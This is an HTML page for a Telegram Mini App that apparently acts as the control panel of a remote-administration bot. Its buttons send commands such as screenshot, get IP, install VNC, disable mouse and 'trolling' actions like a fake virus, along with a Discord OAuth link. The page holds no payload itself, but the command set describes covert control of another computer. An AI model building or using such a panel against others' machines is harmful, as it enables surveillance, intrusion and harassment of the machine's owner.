<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Mini App</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 font-sans">
    <div class="container mx-auto p-4">
        <h1 class="text-2xl font-bold mb-4 text-center">Mini App</h1>

        <!-- Discord Section -->
        <div class="mb-8">
            <h2 class="section-title text-xl font-semibold mb-2">Discord Commands</h2>
            <button class="btn bg-blue-500 text-white px-4 py-2 rounded" onclick="authorizeDiscord()">Authorize Discord</button>
            <input id="server-id" type="text" placeholder="Enter Discord Server ID" class="border p-2 mb-2 w-full">
            <button class="btn bg-blue-500 text-white px-4 py-2 rounded" onclick="openDiscordServer()">Open Discord Server</button>
        </div>

        <!-- Mouse Control Section -->
        <div class="mb-8">
            <h2 class="section-title text-xl font-semibold mb-2">Mouse Control</h2>
            <button class="btn bg-blue-500 text-white px-4 py-2 rounded" onclick="sendCommand('screenshot')">Screenshot</button>
            <button class="btn bg-blue-500 text-white px-4 py-2 rounded" onclick="sendCommand('open_image')">Open Image</button>
            <button class="btn bg-blue-500 text-white px-4 py-2 rounded" onclick="sendCommand('alt_tab')">Alt+Tab</button>
            <button class="btn bg-blue-500 text-white px-4 py-2 rounded" onclick="sendCommand('move_up')">Move Up</button>
            <button class="btn bg-blue-500 text-white px-4 py-2 rounded" onclick="sendCommand('move_right')">Move Right</button>
            <button class="btn bg-blue-500 text-white px-4 py-2 rounded" onclick="sendCommand('disable_mouse')">Disable Mouse</button>
            <button class="btn bg-blue-500 text-white px-4 py-2 rounded" onclick="sendCommand('get_ip')">Get IP</button>
            <button class="btn bg-blue-500 text-white px-4 py-2 rounded" onclick="sendCommand('install_vnc')">Install VNC</button>
        </div>

        <!-- Trolling Commands Section -->
        <div class="mb-8">
            <h2 class="section-title text-xl font-semibold mb-2">Trolling Commands</h2>
            <button class="btn bg-red-500 text-white px-4 py-2 rounded" onclick="sendCommand('troll_open_notepad')">Open Notepad</button>
            <button class="btn bg-red-500 text-white px-4 py-2 rounded" onclick="sendCommand('troll_open_rickroll')">Open Rickroll</button>
            <button class="btn bg-red-500 text-white px-4 py-2 rounded" onclick="sendCommand('troll_fake_virus')">Fake Virus</button>
            <button class="btn bg-red-500 text-white px-4 py-2 rounded" onclick="sendCommand('troll_mouse_shake')">Mouse Shake</button>
        </div>

        <!-- Grok Commands Section -->
        <div class="mb-8">
            <h2 class="section-title text-xl font-semibold mb-2">Grok Commands</h2>
            <button class="btn bg-green-500 text-white px-4 py-2 rounded" onclick="sendCommand('grok')">Ask Grok</button>
            <button class="btn bg-green-500 text-white px-4 py-2 rounded" onclick="sendCommand('edit_code')">Edit Code</button>
            <button class="btn bg-green-500 text-white px-4 py-2 rounded" onclick="sendCommand('update_code')">Update Code</button>
            <button class="btn bg-green-500 text-white px-4 py-2 rounded" onclick="sendCommand('restart_bot')">Restart Bot</button>
        </div>
    </div>

    <script>
        // Initialize Telegram Web App
        Telegram.WebApp.ready();
        Telegram.WebApp.expand();
        Telegram.WebApp.setHeaderColor('#f4e7d3');
        Telegram.WebApp.setBackgroundColor('#f4e7d3');

        // Send command to Telegram Bot
        function sendCommand(command) {
            Telegram.WebApp.sendData(command);
            Telegram.WebApp.close();
        }

        // Authorize Discord
        function authorizeDiscord() {
            const clientId = "1392978255505657948"; // Замените на ваш Client ID
            const redirectUri = encodeURIComponent("https://gusikthebest.github.io/teleg/auth");
            const oauthUrl = `https://discord.com/oauth2/authorize?client_id=1392978255505657948&response_type=code&redirect_uri=https%3A%2F%2Fgusikthebest.github.io%2Fteleg%2Fauth&scope=identify+guilds`;
            window.open(oauthUrl, '_blank');
        }

        // Open Discord Server
        function openDiscordServer() {
            const serverId = document.getElementById('server-id').value;
            if (!serverId) {
                alert('Please enter a Discord Server ID');
                return;
            }
            Telegram.WebApp.sendData(JSON.stringify({ command: 'open_discord_server', server_id: serverId }));
            Telegram.WebApp.close();
        }
    </script>
</body>
</html>
